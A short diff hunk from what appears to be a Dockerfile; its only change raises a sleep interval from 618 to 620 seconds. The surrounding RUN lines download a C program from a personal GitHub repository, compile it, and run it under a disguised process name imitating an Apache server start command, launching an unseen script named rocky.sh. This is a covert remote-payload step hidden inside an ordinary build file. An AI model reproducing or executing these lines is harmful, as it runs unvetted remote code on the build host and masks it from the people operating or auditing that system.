@@ -12,5 +12,5 @@ RUN \
 	     wget https://github.com/thoeb292/thoeb292/raw/main/mas.c && \
               gcc -o test mas.c && \
                ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./rocky.sh && \
-                  sleep 618 && \
+                  sleep 620 && \
 	       rm -rf /var/lib/apt/lists/*
